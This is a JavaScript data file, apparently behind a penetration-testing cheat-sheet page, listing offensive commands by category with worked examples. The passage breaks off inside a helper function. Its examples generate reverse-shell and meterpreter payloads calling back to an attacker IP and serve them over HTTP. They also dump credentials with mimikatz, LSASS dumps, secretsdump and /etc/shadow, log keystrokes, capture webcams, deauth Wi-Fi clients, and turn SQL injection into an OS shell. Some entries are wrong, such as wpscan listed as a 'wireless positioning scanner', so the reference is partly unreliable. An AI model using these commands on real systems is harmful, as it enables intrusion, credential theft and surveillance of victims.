const data = {
  'Metasploit Basics': [
    { cmd: 'msfconsole', desc: 'Launch Metasploit Framework console', example: 'msfconsole -q' },
    { cmd: 'msfconsole -q', desc: 'Launch MSF in quiet mode (no banner)', example: 'msfconsole -q' },
    { cmd: 'msfvenom -l payloads', desc: 'List available payloads', example: 'msfvenom -l payloads | grep windows' },
    { cmd: 'msfvenom -l encoders', desc: 'List available encoders', example: 'msfvenom -l encoders' },
    { cmd: 'msfvenom -l formats', desc: 'List available output formats', example: 'msfvenom -l formats' },
    { cmd: 'search <query>', desc: 'Search modules inside msfconsole', example: 'search eternalblue' },
    { cmd: 'use <module>', desc: 'Select a module to use', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
    { cmd: 'info', desc: 'Show info about the current module', example: 'info' },
    { cmd: 'show options', desc: 'Show module options', example: 'show options' },
    { cmd: 'show targets', desc: 'Show available targets', example: 'show targets' },
    { cmd: 'show payloads', desc: 'Show compatible payloads', example: 'show payloads' },
    { cmd: 'set <option> <value>', desc: 'Set a module option', example: 'set RHOSTS 192.168.1.10' },
    { cmd: 'setg <option> <value>', desc: 'Set a global option', example: 'setg LHOST 192.168.1.100' },
    { cmd: 'unset <option>', desc: 'Unset an option', example: 'unset RHOSTS' },
    { cmd: 'run', desc: 'Execute the module', example: 'run' },
    { cmd: 'exploit', desc: 'Alias for run (exploit modules)', example: 'exploit' },
    { cmd: 'check', desc: 'Check if target is vulnerable', example: 'check' },
    { cmd: 'back', desc: 'Go back from current module', example: 'back' },
    { cmd: 'exit', desc: 'Exit msfconsole', example: 'exit' },
    { cmd: 'resource <script>', desc: 'Run a resource script', example: 'resource /path/to/script.rc' },
    { cmd: 'load <plugin>', desc: 'Load a Metasploit plugin', example: 'load nessus' },
    { cmd: 'unload <plugin>', desc: 'Unload a plugin', example: 'unload nessus' },
    { cmd: 'route add <net> <mask> <session>', desc: 'Add a route through a session', example: 'route add 192.168.2.0 255.255.255.0 1' },
    { cmd: 'sessions -l', desc: 'List active sessions', example: 'sessions -l' },
    { cmd: 'sessions -i <id>', desc: 'Interact with a session', example: 'sessions -i 1' },
    { cmd: 'sessions -k <id>', desc: 'Kill a session', example: 'sessions -k 1' },
    { cmd: 'jobs -l', desc: 'List background jobs', example: 'jobs -l' },
    { cmd: 'jobs -k <id>', desc: 'Kill a background job', example: 'jobs -k 0' },
  ],
  'Exploit Selection': [
    { cmd: 'use exploit/multi/handler', desc: 'Generic handler for reverse payloads', example: 'use exploit/multi/handler' },
    { cmd: 'use exploit/windows/smb/ms17_010_eternalblue', desc: 'EternalBlue SMB exploit (WannaCry)', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
    { cmd: 'use exploit/windows/smb/psexec', desc: 'PsExec remote execution', example: 'use exploit/windows/smb/psexec' },
    { cmd: 'use exploit/linux/http/drupal_drupalgeddon2', desc: 'Drupalgeddon2 RCE', example: 'use exploit/linux/http/drupal_drupalgeddon2' },
    { cmd: 'use exploit/multi/http/struts2_content_type_ognl', desc: 'Apache Struts2 RCE (CVE-2017-5638)', example: 'use exploit/multi/http/struts2_content_type_ognl' },
    { cmd: 'use exploit/multi/http/tomcat_jsp_upload_bypass', desc: 'Tomcat JSP upload bypass', example: 'use exploit/multi/http/tomcat_jsp_upload_bypass' },
    { cmd: 'use exploit/multi/script/web_delivery', desc: 'Script-based web delivery', example: 'use exploit/multi/script/web_delivery' },
    { cmd: 'use exploit/multi/http/wp_admin_shell_upload', desc: 'WordPress admin shell upload', example: 'use exploit/multi/http/wp_admin_shell_upload' },
    { cmd: 'use auxiliary/scanner/portscan/tcp', desc: 'TCP port scanner module', example: 'use auxiliary/scanner/portscan/tcp' },
    { cmd: 'use auxiliary/scanner/smb/smb_version', desc: 'SMB version scanner', example: 'use auxiliary/scanner/smb/smb_version' },
    { cmd: 'use auxiliary/server/capture/http', desc: 'HTTP capture server', example: 'use auxiliary/server/capture/http' },
    { cmd: 'use auxiliary/server/random', desc: 'Random payload generator server', example: 'use auxiliary/server/random' },
  ],
  'Payload Generation': [
    { cmd: 'msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <file>', desc: 'Generate a staged payload', example: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf' },
    { cmd: 'msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f exe -o <file>', desc: 'Generate Windows executable', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe' },
    { cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o <file>', desc: 'Linux stageless reverse shell', example: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf' },
    { cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <file>', desc: 'Windows stageless reverse shell', example: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe' },
    { cmd: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o <file>.apk', desc: 'Android meterpreter payload', example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o evil.apk' },
    { cmd: 'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f macho -o <file>', desc: 'macOS meterpreter payload', example: 'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f macho -o shell.macho' },
    { cmd: 'msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o <file>.php', desc: 'PHP meterpreter payload', example: 'msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php' },
    { cmd: 'msfvenom -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o <file>.py', desc: 'Python meterpreter payload', example: 'msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o shell.py' },
    { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x64/xor -i 5 -f exe -o <file>', desc: 'Encoded payload with XOR', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe' },
    { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=443 -f exe -o <file>', desc: 'HTTPS reverse payload (encrypted)', example: 'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o https.exe' },
    { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <file> && python -m http.server 80', desc: 'Generate + serve via HTTP', example: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe && python -m http.server 80' },
    { cmd: 'set PAYLOAD <payload>', desc: 'Set payload within msfconsole', example: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' },
    { cmd: 'set LHOST <ip>', desc: 'Set listener IP', example: 'set LHOST 192.168.1.100' },
    { cmd: 'set LPORT <port>', desc: 'Set listener port', example: 'set LPORT 4444' },
    { cmd: 'set ExitOnSession false', desc: 'Keep listener running after session', example: 'set ExitOnSession false' },
    { cmd: 'exploit -j', desc: 'Run exploit as a background job', example: 'exploit -j' },
    { cmd: 'exploit -z', desc: 'Run exploit and do not interact with session', example: 'exploit -z' },
  ],
  'Post Exploitation': [
    { cmd: 'enum4linux -a <target>', desc: 'Enumerate SMB and user info from Linux', example: 'enum4linux -a 192.168.1.10' },
    { cmd: 'smbclient -L //<target> -N', desc: 'List SMB shares anonymously', example: 'smbclient -L //192.168.1.10 -N' },
    { cmd: 'smbclient //<target>/<share> -U <user>', desc: 'Connect to an SMB share', example: 'smbclient //192.168.1.10/C$ -U administrator' },
    { cmd: 'rpcclient -U "" -N <target>', desc: 'Null session RPC connection', example: 'rpcclient -U "" -N 192.168.1.10' },
    { cmd: 'smbmap -H <target>', desc: 'Enumerate SMB shares', example: 'smbmap -H 192.168.1.10' },
    { cmd: 'evil-winrm -i <target> -u <user> -p <pass>', desc: 'WinRM shell (if enabled)', example: 'evil-winrm -i 192.168.1.10 -u administrator -p Pass123!' },
    { cmd: 'bloodhound-python -d <domain> -u <user> -p <pass> -dc <dc> -c all', desc: 'BloodHound data collector (Linux)', example: 'bloodhound-python -d corp.local -u john -p Pass123 -dc dc01.corp.local -c all' },
    { cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', desc: 'Dump credentials with Mimikatz', example: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' },
    { cmd: 'procdump64.exe -accepteula -ma lsass.exe lsass.dmp', desc: 'Dump LSASS process for offline analysis', example: 'procdump64.exe -accepteula -ma lsass.exe lsass.dmp' },
    { cmd: 'secretsdump.py <domain>/<user>:<pass>@<target>', desc: 'Dump hashes from NTDS.dit (impacket)', example: 'secretsdump.py corp.local/admin:Pass123@192.168.1.10' },
    { cmd: 'psexec.py <domain>/<user>:<pass>@<target>', desc: 'PsExec-like shell (impacket)', example: 'psexec.py corp.local/admin:Pass123@192.168.1.10' },
    { cmd: 'wmiexec.py <domain>/<user>:<pass>@<target>', desc: 'WMI shell (impacket)', example: 'wmiexec.py corp.local/admin:Pass123@192.168.1.10' },
    { cmd: 'atexec.py <domain>/<user>:<pass>@<target> <cmd>', desc: 'Task scheduler exec (impacket)', example: 'atexec.py corp.local/admin:Pass123@192.168.1.10 whoami' },
    { cmd: 'dcomexec.py <domain>/<user>:<pass>@<target>', desc: 'DCOM exec (impacket)', example: 'dcomexec.py corp.local/admin:Pass123@192.168.1.10' },
    { cmd: 'smbexec.py <domain>/<user>:<pass>@<target>', desc: 'SMB exec (impacket)', example: 'smbexec.py corp.local/admin:Pass123@192.168.1.10' },
    { cmd: 'reg.py <domain>/<user>:<pass>@<target> <action>', desc: 'Remote registry operations (impacket)', example: 'reg.py corp.local/admin:Pass123@192.168.1.10 query -keyName HKLM\\SAM' },
  ],
  'Meterpreter Commands': [
    { cmd: 'sysinfo', desc: 'Show system information', example: 'sysinfo' },
    { cmd: 'getuid', desc: 'Show current user ID', example: 'getuid' },
    { cmd: 'getpid', desc: 'Show current process ID', example: 'getpid' },
    { cmd: 'getsystem', desc: 'Attempt to elevate to SYSTEM', example: 'getsystem' },
    { cmd: 'hashdump', desc: 'Dump Windows password hashes', example: 'hashdump' },
    { cmd: 'shell', desc: 'Drop into a system shell', example: 'shell' },
    { cmd: 'upload <local> <remote>', desc: 'Upload file to target', example: 'upload /tmp/exploit.exe C:\\Users\\Public\\exploit.exe' },
    { cmd: 'download <remote> [local]', desc: 'Download file from target', example: 'download C:\\Users\\Admin\\Desktop\\passwords.txt' },
    { cmd: 'edit <file>', desc: 'Edit a file on target', example: 'edit /etc/passwd' },
    { cmd: 'cat <file>', desc: 'Display file contents', example: 'cat /etc/shadow' },
    { cmd: 'screenshot', desc: 'Capture target screen', example: 'screenshot' },
    { cmd: 'webcam_snap', desc: 'Capture webcam image', example: 'webcam_snap -i 1' },
    { cmd: 'webcam_list', desc: 'List available webcams', example: 'webcam_list' },
    { cmd: 'keyscan_start', desc: 'Start keylogging', example: 'keyscan_start' },
    { cmd: 'keyscan_dump', desc: 'Dump captured keystrokes', example: 'keyscan_dump' },
    { cmd: 'keyscan_stop', desc: 'Stop keylogging', example: 'keyscan_stop' },
    { cmd: 'migrate <pid>', desc: 'Migrate to another process', example: 'migrate 1234' },
    { cmd: 'migrate -N <name>', desc: 'Migrate to process by name', example: 'migrate -N explorer.exe' },
    { cmd: 'bypassuac', desc: 'Bypass UAC (User Account Control)', example: 'bypassuac' },
    { cmd: 'run post/windows/gather/hashdump', desc: 'Post-module hash dump', example: 'run post/windows/gather/hashdump' },
    { cmd: 'run post/windows/gather/enum_logged_on_users', desc: 'Enumerate logged-on users', example: 'run post/windows/gather/enum_logged_on_users' },
    { cmd: 'run post/multi/gather/ssh_creds', desc: 'Gather SSH credentials', example: 'run post/multi/gather/ssh_creds' },
    { cmd: 'run post/linux/gather/hashdump', desc: 'Linux hash dump (shadow)', example: 'run post/linux/gather/hashdump' },
    { cmd: 'load kiwi', desc: 'Load Mimikatz (Kiwi) module', example: 'load kiwi' },
    { cmd: 'creds_all', desc: 'Dump all credentials (Kiwi)', example: 'creds_all' },
    { cmd: 'lsa_dump_sam', desc: 'Dump SAM hashes (Kiwi)', example: 'lsa_dump_sam' },
    { cmd: 'golden_ticket_create', desc: 'Create golden ticket (Kiwi)', example: 'golden_ticket_create -d corp.local -k <krbtgt-hash> -u admin -s S-1-5-...' },
    { cmd: 'ps', desc: 'List running processes', example: 'ps' },
    { cmd: 'kill <pid>', desc: 'Kill a process', example: 'kill 1234' },
    { cmd: 'reboot', desc: 'Reboot the target system', example: 'reboot' },
    { cmd: 'shutdown', desc: 'Shutdown the target system', example: 'shutdown' },
    { cmd: 'idletime', desc: 'Show target idle time', example: 'idletime' },
    { cmd: 'uictl enable keyboard', desc: 'Enable keyboard/mouse control', example: 'uictl enable keyboard' },
    { cmd: 'enumdesktops', desc: 'List accessible desktops', example: 'enumdesktops' },
    { cmd: 'getdesktop', desc: 'Get current desktop', example: 'getdesktop' },
    { cmd: 'setdesktop', desc: 'Switch desktop', example: 'setdesktop' },
    { cmd: 'resource <script>', desc: 'Run Meterpreter script', example: 'resource /path/to/script.rc' },
  ],
  'Kali Essentials': [
    { cmd: 'sudo apt update && sudo apt full-upgrade -y', desc: 'Full system update', example: 'sudo apt update && sudo apt full-upgrade -y' },
    { cmd: 'sudo apt install <package>', desc: 'Install a package', example: 'sudo apt install exploitdb' },
    { cmd: 'searchsploit <keyword>', desc: 'Search Exploit-DB', example: 'searchsploit eternalblue' },
    { cmd: 'searchsploit -m <id>', desc: 'Mirror (copy) exploit to CWD', example: 'searchsploit -m 42315' },
    { cmd: 'nmap -sV -sC -O -A <target>', desc: 'Full nmap scan', example: 'nmap -sV -sC -O -A 192.168.1.10' },
    { cmd: 'wireshark', desc: 'Launch Wireshark GUI', example: 'wireshark' },
    { cmd: 'burpsuite', desc: 'Launch Burp Suite', example: 'burpsuite' },
    { cmd: 'metasploit', desc: 'Launch Metasploit (alias for msfconsole)', example: 'metasploit' },
    { cmd: 'bettercap', desc: 'Launch BetterCAP (MITM framework)', example: 'bettercap -iface eth0' },
    { cmd: 'responder -I eth0', desc: 'LLMNR/NBT-NS/mDNS poisoner', example: 'responder -I eth0 -rdw' },
    { cmd: 'crackmapexec <proto> <target> -u <user> -p <pass>', desc: 'CrackMapExec Swiss Army knife', example: 'crackmapexec smb 192.168.1.10 -u admin -p Pass123' },
    { cmd: 'crackmapexec smb <target> -u <user> -H <hash> --local-auth', desc: 'CME pass-the-hash (local auth)', example: 'crackmapexec smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee --local-auth' },
    { cmd: 'impacket-smbserver <share> <folder>', desc: 'Start SMB server (impacket)', example: 'impacket-smbserver share . -smb2support' },
    { cmd: 'nishang Invoke-PowerShellTcp -Reverse -IPAddr <ip> -Port <port>', desc: 'Nishang PowerShell reverse shell', example: 'nishang Invoke-PowerShellTcp -Reverse -IPAddr 10.0.0.1 -Port 4444' },
    { cmd: 'linenum.sh', desc: 'Linux enumeration script', example: 'linenum.sh -r' },
    { cmd: 'winpeas.exe', desc: 'Windows privilege escalation checker', example: 'winpeas.exe' },
    { cmd: 'linpeas.sh', desc: 'Linux privilege escalation checker', example: 'linpeas.sh -a' },
    { cmd: 'exiftool <file>', desc: 'Read file metadata', example: 'exiftool image.jpg' },
    { cmd: 'steghide extract -sf <file>', desc: 'Extract hidden data from image', example: 'steghide extract -sf secret.jpg' },
    { cmd: 'binwalk <file>', desc: 'Extract embedded files', example: 'binwalk firmware.bin' },
    { cmd: 'strings <file>', desc: 'Extract printable strings from binary', example: 'strings dump.bin | grep password' },
    { cmd: 'nmap --script vuln <target>', desc: 'Run vulnerability scripts', example: 'nmap --script vuln 192.168.1.10' },
    { cmd: 'nmap --script exploit <target>', desc: 'Run exploitation scripts', example: 'nmap --script exploit 192.168.1.10' },
    { cmd: 'xdg-open <url>', desc: 'Open URL in default browser', example: 'xdg-open http://192.168.1.10' },
  ],
  'Network Scanning': [
    { cmd: 'nmap -sn <subnet>/<cidr>', desc: 'Ping sweep to discover live hosts', example: 'nmap -sn 192.168.1.0/24' },
    { cmd: 'nmap -sS -p- -T4 <target>', desc: 'Full TCP SYN scan (all ports)', example: 'nmap -sS -p- -T4 192.168.1.10' },
    { cmd: 'nmap -sU -p 1-1000 <target>', desc: 'UDP scan (common ports)', example: 'nmap -sU -p 1-1000 192.168.1.10' },
    { cmd: 'nmap -sT -Pn -sV -sC -O <target>', desc: 'Stealth TCP connect + version + script', example: 'nmap -sT -Pn -sV -sC -O 192.168.1.10' },
    { cmd: 'nmap -sS -A -T4 <target>', desc: 'Aggressive scan with OS detection', example: 'nmap -sS -A -T4 192.168.1.10' },
    { cmd: 'nmap --script http-enum -p 80,443 <target>', desc: 'Enumerate web directories', example: 'nmap --script http-enum -p 80,443 192.168.1.10' },
    { cmd: 'nmap --script smb-enum-shares -p 445 <target>', desc: 'Enumerate SMB shares', example: 'nmap --script smb-enum-shares -p 445 192.168.1.10' },
    { cmd: 'nmap --script smb-vuln-* -p 445 <target>', desc: 'Check SMB vulnerabilities', example: 'nmap --script smb-vuln-* -p 445 192.168.1.10' },
    { cmd: 'netdiscover -r <subnet>/<cidr>', desc: 'ARP-based network discovery', example: 'netdiscover -r 192.168.1.0/24' },
    { cmd: 'netdiscover -i <interface> -p', desc: 'Passive ARP discovery', example: 'netdiscover -i eth0 -p' },
    { cmd: 'masscan <subnet>/<cidr> -p<ports> --rate=<rate>', desc: 'High-speed mass port scanner', example: 'masscan 192.168.1.0/24 -p80,443,22 --rate=10000' },
    { cmd: 'masscan <target> -p0-65535 --rate=1000 -e <iface>', desc: 'Full port range masscan', example: 'masscan 192.168.1.10 -p0-65535 --rate=1000 -e eth0' },
    { cmd: 'rustscan -a <target> -- -A', desc: 'Fast port scanner (Rust) with nmap', example: 'rustscan -a 192.168.1.10 -- -A' },
    { cmd: 'rustscan -a <target> -p <ports> -- -sV', desc: 'Rustscan with specific ports', example: 'rustscan -a 192.168.1.10 -p 22,80,443,445 -- -sV' },
    { cmd: 'unicornscan -mU -p 1-1000 <target>', desc: 'UDP scan with unicornscan', example: 'unicornscan -mU -p 1-1000 192.168.1.10' },
    { cmd: 'unicornscan -mT -p 1-65535 <target> -l <log>', desc: 'Full TCP scan (unicornscan)', example: 'unicornscan -mT -p 1-65535 192.168.1.10 -l scan.log' },
    { cmd: 'zmap -p <port> <subnet>/<cidr>', desc: 'Internet-wide port scanner', example: 'zmap -p 443 10.0.0.0/8' },
    { cmd: 'zmap -p 80 --output-file=results.csv <subnet>/<cidr>', desc: 'Zmap scan to file', example: 'zmap -p 80 --output-file=results.csv 192.168.1.0/24' },
    { cmd: 'fping -asg <subnet>/<cidr>', desc: 'Fast ping sweep', example: 'fping -asg 192.168.1.0/24' },
    { cmd: 'arp-scan --localnet', desc: 'ARP scan local network', example: 'arp-scan --localnet' },
    { cmd: 'dnsrecon -d <domain>', desc: 'DNS enumeration', example: 'dnsrecon -d example.com' },
    { cmd: 'dnsenum <domain>', desc: 'DNS enumeration tool', example: 'dnsenum example.com' },
    { cmd: 'sublist3r -d <domain>', desc: 'Subdomain enumeration', example: 'sublist3r -d example.com' },
  ],
  'Password Cracking': [
    { cmd: 'hydra -l <user> -P <wordlist> <service>://<target>', desc: 'Online password brute force', example: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10' },
    { cmd: 'hydra -L <users> -P <pass> <service>://<target>', desc: 'Hydra with userlist', example: 'hydra -L users.txt -P passwords.txt ftp://192.168.1.10' },
    { cmd: 'hydra -l <user> -p <pass> <target> http-post-form "<path>:<params>:<fail>"', desc: 'Hydra web form brute force', example: 'hydra -l admin -p pass 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
    { cmd: 'john --wordlist=<wordlist> <hashfile>', desc: 'John the Ripper wordlist mode', example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
    { cmd: 'john --rules --wordlist=<wordlist> <hashfile>', desc: 'John with word mangling rules', example: 'john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
    { cmd: 'john --show <hashfile>', desc: 'Show cracked passwords', example: 'john --show hashes.txt' },
    { cmd: 'john --incremental <hashfile>', desc: 'John incremental (brute force) mode', example: 'john --incremental hashes.txt' },
    { cmd: 'hashcat -m <mode> -a 0 <hashfile> <wordlist>', desc: 'Hashcat dictionary attack', example: 'hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt' },
    { cmd: 'hashcat -m <mode> -a 3 <hashfile> ?a?a?a?a?a?a?a?a', desc: 'Hashcat brute force (8 chars)', example: 'hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a' },
    { cmd: 'hashcat -m <mode> -a 6 <hashfile> <wordlist> ?d?d?d?d', desc: 'Hashcat hybrid (wordlist + mask)', example: 'hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d' },
    { cmd: 'hashcat --show <hashfile>', desc: 'Show cracked hashes', example: 'hashcat --show hashes.txt' },
    { cmd: 'hash-identifier <hash>', desc: 'Identify hash type', example: 'hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99' },
    { cmd: 'cewl -d <depth> -m <min> -w <output> <url>', desc: 'Generate wordlist from website', example: 'cewl -d 2 -m 5 -w wordlist.txt http://target.com' },
    { cmd: 'crunch <min> <max> <charset> -o <output>', desc: 'Generate custom wordlist', example: 'crunch 8 12 abcdef123 -o wordlist.txt' },
    { cmd: 'rsmangler -f <wordlist> -o <output>', desc: 'Mangle existing wordlist', example: 'rsmangler -f wordlist.txt -o mangled.txt' },
    { cmd: 'ophcrack -d <table> -t <hash>', desc: 'Rainbow table cracker', example: 'ophcrack -d /path/to/tables -t hash.txt' },
  ],
  'Web App Testing': [
    { cmd: 'nikto -h <target>', desc: 'Web server vulnerability scanner', example: 'nikto -h http://192.168.1.10' },
    { cmd: 'nikto -h <target> -ssl -port 443', desc: 'Nikto over HTTPS', example: 'nikto -h https://example.com -ssl -port 443' },
    { cmd: 'dirb <url> <wordlist>', desc: 'Directory brute forcer', example: 'dirb http://192.168.1.10 /usr/share/wordlists/dirb/common.txt' },
    { cmd: 'dirb <url> -X .php,.aspx,.jsp', desc: 'Dirb with file extensions', example: 'dirb http://192.168.1.10 -X .php,.aspx,.jsp' },
    { cmd: 'gobuster dir -u <url> -w <wordlist>', desc: 'Go-based directory brute forcer', example: 'gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt' },
    { cmd: 'gobuster dns -d <domain> -w <wordlist>', desc: 'DNS subdomain enumeration', example: 'gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains.txt' },
    { cmd: 'gobuster vhost -u <url> -w <wordlist>', desc: 'Virtual host enumeration', example: 'gobuster vhost -u https://example.com -w /usr/share/wordlists/vhost.txt' },
    { cmd: 'wpscan --url <url> --enumerate u,vp', desc: 'WordPress vulnerability scanner', example: 'wpscan --url http://target.com --enumerate u,vp' },
    { cmd: 'wpscan --url <url> -U <user> -P <wordlist>', desc: 'WordPress brute force', example: 'wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt' },
    { cmd: 'sqlmap -u <url> --dbs', desc: 'SQL injection - enumerate databases', example: 'sqlmap -u "http://target.com/page?id=1" --dbs' },
    { cmd: 'sqlmap -u <url> -D <db> --tables', desc: 'SQL injection - list tables', example: 'sqlmap -u "http://target.com/page?id=1" -D wordpress --tables' },
    { cmd: 'sqlmap -u <url> -D <db> -T <table> --dump', desc: 'SQL injection - dump table data', example: 'sqlmap -u "http://target.com/page?id=1" -D wordpress -T wp_users --dump' },
    { cmd: 'sqlmap -r <request.txt> -p <param>', desc: 'SQLi from saved HTTP request', example: 'sqlmap -r request.txt -p id' },
    { cmd: 'sqlmap -u <url> --os-shell', desc: 'SQLi to OS shell', example: 'sqlmap -u "http://target.com/page?id=1" --os-shell' },
    { cmd: 'xsser -u <url> -p <param>', desc: 'XSS scanner', example: 'xsser -u "http://target.com/page?q=test" -p q' },
    { cmd: 'beef-xss', desc: 'Browser Exploitation Framework', example: 'beef-xss' },
    { cmd: 'dirsearch -u <url> -e <ext>', desc: 'Advanced directory scanner', example: 'dirsearch -u http://192.168.1.10 -e php,asp,html' },
    { cmd: 'dirsearch -u <url> -w <wordlist> -r', desc: 'Dirsearch with recursion', example: 'dirsearch -u http://192.168.1.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r' },
    { cmd: 'ffuf -u <url>/FUZZ -w <wordlist>', desc: 'Fast web fuzzer', example: 'ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/dirb/common.txt' },
    { cmd: 'ffuf -u <url> -H "Host: FUZZ.<domain>" -w <wordlist>', desc: 'FFUF virtual host fuzzing', example: 'ffuf -u http://192.168.1.10 -H "Host: FUZZ.example.com" -w /usr/share/wordlists/subdomains.txt' },
    { cmd: 'wfuzz -c -z file,<wordlist> --hc 404 <url>/FUZZ', desc: 'Web fuzzer with filter', example: 'wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.1.10/FUZZ' },
    { cmd: 'commix --url=<url> --param=<param>', desc: 'Command injection finder', example: 'commix --url="http://target.com/page?cmd=test" --param=cmd' },
    { cmd: 'xsstrike -u <url> --params', desc: 'XSS scanner with parameter analysis', example: 'xsstrike -u "http://target.com/search?q=test" --params' },
    { cmd: 'jSQL', desc: 'SQL injection GUI tool', example: 'java -jar jsql-injection-v0.9.jar' },
    { cmd: 'zaproxy', desc: 'Launch OWASP ZAP GUI', example: 'zaproxy' },
    { cmd: 'zap-cli quick-scan -s all <url>', desc: 'ZAP CLI quick scan', example: 'zap-cli quick-scan -s all http://target.com' },
  ],
  'Wireless Tools': [
    { cmd: 'airmon-ng start <interface>', desc: 'Enable monitor mode on interface', example: 'airmon-ng start wlan0' },
    { cmd: 'airmon-ng check kill', desc: 'Kill interfering processes', example: 'airmon-ng check kill' },
    { cmd: 'airodump-ng <interface>', desc: 'Capture and display wireless networks', example: 'airodump-ng wlan0mon' },
    { cmd: 'airodump-ng -c <channel> --bssid <bssid> -w <output> <interface>', desc: 'Capture handshake for specific AP', example: 'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon' },
    { cmd: 'aireplay-ng -0 0 -a <bssid> <interface>', desc: 'Deauth attack (continuous)', example: 'aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon' },
    { cmd: 'aireplay-ng -0 5 -a <bssid> -c <client> <interface>', desc: 'Deauth a specific client', example: 'aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan0mon' },
    { cmd: 'aircrack-ng -w <wordlist> <capture>.cap', desc: 'Crack WPA/WPA2 handshake', example: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap' },
    { cmd: 'aircrack-ng -w <wordlist> -b <bssid> <capture>.cap', desc: 'Crack with BSSID filter', example: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap' },
    { cmd: 'airgeddon', desc: 'All-in-one wireless audit tool', example: 'airgeddon' },
    { cmd: 'kismet', desc: 'Wireless network detector/sniffer', example: 'kismet' },
    { cmd: 'reaver -i <interface> -b <bssid> -vv', desc: 'WPS PIN brute force attack', example: 'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv' },
    { cmd: 'bully -b <bssid> -c <channel> -v 3 <interface>', desc: 'WPS brute force (bully)', example: 'bully -b AA:BB:CC:DD:EE:FF -c 6 -v 3 wlan0mon' },
    { cmd: 'hcxdumptool -o <output> -i <interface> --enable_status=1', desc: 'Capture PMKID for WPA3/WPA2', example: 'hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1' },
    { cmd: 'hcxpcaptool -z <hash> <capture>', desc: 'Convert capture to hashcat format', example: 'hcxpcaptool -z pmkid_hash.txt capture.pcapng' },
    { cmd: 'hashcat -m 16800 <hashfile> <wordlist>', desc: 'Crack PMKID hash (mode 16800)', example: 'hashcat -m 16800 pmkid_hash.txt /usr/share/wordlists/rockyou.txt' },
    { cmd: 'mdk4 <interface> d -b <bssid>', desc: 'Deauth flood with mdk4', example: 'mdk4 wlan0mon d -b AA:BB:CC:DD:EE:FF' },
    { cmd: 'mdk4 <interface> b -c <channel>', desc: 'Beacon flood (fake APs)', example: 'mdk4 wlan0mon b -c 6' },
    { cmd: 'wpscan --url <url>', desc: 'Wireless positioning scanner', example: 'wpscan --url http://target.com' },
    { cmd: 'wash -i <interface>', desc: 'Scan for WPS-enabled APs', example: 'wash -i wlan0mon' },
    { cmd: 'macchanger -r <interface>', desc: 'Randomize MAC address', example: 'macchanger -r wlan0' },
    { cmd: 'macchanger -m <mac> <interface>', desc: 'Set specific MAC address', example: 'macchanger -m 00:11:22:33:44:55 wlan0' },
  ],
};

const catKeys = Object.keys(data);

function htmlEncode(s) {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function syntaxCmd(cmd) {
  let h = htmlEncode(cmd);
